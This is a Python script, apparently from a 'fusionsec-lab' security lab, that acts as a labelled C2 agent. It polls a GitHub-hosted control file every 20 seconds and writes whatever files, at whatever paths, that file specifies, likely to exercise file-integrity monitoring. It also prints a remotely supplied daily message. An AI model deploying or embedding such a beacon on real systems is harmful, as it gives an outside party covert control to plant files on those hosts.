import os
import time
import json
import urllib.request
import datetime


# ---------------------------------------------------------
# Directories
# ---------------------------------------------------------

BASE_DIR = os.path.dirname(os.path.dirname(__file__))  # fusionsec-lab/
RUNTIME_DIR = os.path.join(BASE_DIR, "runtime")

os.makedirs(RUNTIME_DIR, exist_ok=True)

CONTROL_URL = "https://raw.githubusercontent.com/kucukkgl/fusionsec-control/refs/heads/main/control/fim_actions.json"

LOCAL_FILE = os.path.join(RUNTIME_DIR, "fim_actions.json")
CACHE_FILE = os.path.join(RUNTIME_DIR, "fim_actions_cache.json")


# ---------------------------------------------------------
# Pull JSON from GitHub (urllib version)
# ---------------------------------------------------------

def pull_c2_file():
    try:
        with urllib.request.urlopen(CONTROL_URL, timeout=10) as resp:
            data = resp.read()

        with open(LOCAL_FILE, "wb") as f:
            f.write(data)

        print("[C2] Pulled latest control file", flush=True)
        return True

    except Exception as e:
        print(f"[C2] Error pulling control file: {e}", flush=True)
        return False


# ---------------------------------------------------------
# Load JSON
# ---------------------------------------------------------

def load_c2_json():
    try:
        with open(LOCAL_FILE, "r") as f:
            return json.load(f)
    except Exception as e:
        print(f"[C2] Error parsing JSON: {e}", flush=True)
        return None


# ---------------------------------------------------------
# Action handlers
# ---------------------------------------------------------

def execute_create_action(path, content=""):
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            f.write(content)

        print(f"[C2] Created file: {path}", flush=True)

    except Exception as e:
        print(f"[C2] Error creating file {path}: {e}", flush=True)


# ---------------------------------------------------------
# Main loop (pingit)
# ---------------------------------------------------------

def pingit():
    print("[C2] pingit thread started (heartbeat active)", flush=True)

    while True:
        if pull_c2_file():

            # Detect changes
            if not os.path.exists(CACHE_FILE) or open(CACHE_FILE).read() != open(LOCAL_FILE).read():
                print("[C2] New action set detected", flush=True)

                # Update cache
                with open(CACHE_FILE, "w") as f:
                    f.write(open(LOCAL_FILE).read())

                data = load_c2_json()
                if not data:
                    continue

                # Expect a list of actions
                actions = data.get("actions", [])

                if not isinstance(actions, list):
                    print("[C2] ERROR: 'actions' must be a list", flush=True)
                    continue

                # Process each action
                for item in actions:

                    # Skip inactive actions
                    if not item.get("isActive", False):
                        print("[C2] Skipping inactive action", flush=True)
                        continue

                    action = item.get("action")

                    if action == "create":
                        execute_create_action(
                            path=item["path"],
                            content=item.get("content", "")
                        )

                    else:
                        print(f"[C2] Unknown action: {action}", flush=True)

        time.sleep(20)

def daily_message_thread():
    print("[C2] Daily message thread started", flush=True)

    while True:
        now = datetime.datetime.now()
        target = now.replace(hour=20, minute=0, second=0, microsecond=0)

        # If 8am already passed today, schedule for tomorrow
        if now > target:
            target = target + datetime.timedelta(days=1)

        seconds_until = (target - now).total_seconds()
        print(f"[C2] Daily message scheduled in {int(seconds_until)} seconds", flush=True)
        time.sleep(seconds_until)

        # Pull latest JSON
        if pull_c2_file():
            data = load_c2_json()
            if data:
                msg = data.get("dailyMessage", None)
                if msg:
                    print("\n===== FusionSec Daily Message =====", flush=True)
                    print(msg, flush=True)
                    print("==================================\n", flush=True)
                else:
                    print("[C2] No dailyMessage found in JSON", flush=True)

        # Prevent double-trigger
        time.sleep(60)